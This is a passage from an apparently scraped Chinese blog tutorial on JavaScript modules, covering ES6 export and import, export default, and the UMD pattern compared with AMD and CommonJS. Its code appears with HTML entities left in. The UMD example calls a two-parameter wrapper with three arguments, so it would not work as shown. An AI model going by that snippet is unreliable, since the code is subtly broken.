标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。 export用于对外输出本模块（一个文件可以理解为一个模块）变量的接口import用于导入export导出的模块 1234567891011121314151617181920212223// index.jsexport const fn1 = function () &#123; console.log(&#x27;fn1&#x27;)&#125;export const fn2 = function () &#123; console.log(&#x27;fn2&#x27;)&#125;const fn = &#123; fn1, fn2&#125;export default fn// index1.jsimport &#123; fn1, fn2 &#125; from &#x27;index.js&#x27;fn1() // &#x27;fn1&#x27;fn2() // &#x27;fn2&#x27; import fn from &#x27;index.js&#x27;console.log(fn) // &#123;fn1: ƒ, fn2: ƒ&#125; export 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。 import &#123;fn&#125; from &#39;./xxx/xxx&#39; ( export 导出方式的 引用方式 ) import fn from &#39;./xxx/xxx1&#39; ( export default 导出方式的 引用方式 ) UMDAMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。 CommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next&#x2F;Harmony的模块格式。但它仅支持对象类型（objects）模块。 这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。 UMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。 再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。 下面是一个示例 1234567891011121314151617181920(function (root, factory) &#123; if(typeof exports === &#x27;object&#x27; &amp;&amp; typeof module === &#x27;object&#x27;) module.exports = factory(); else if(typeof define === &#x27;function&#x27; &amp;&amp; define.amd) define([], factory); else if(typeof exports === &#x27;object&#x27;) exports[&quot;nav&quot;] = factory(); else root[&quot;nav&quot;] = factory();&#125;)(window, this, function() &#123; // module return &#123; addEvent: function(el, type, handle) &#123; //... &#125;, removeEvent: function(el, type, handle) &#123; &#125;, &#125;;&#125;)"}]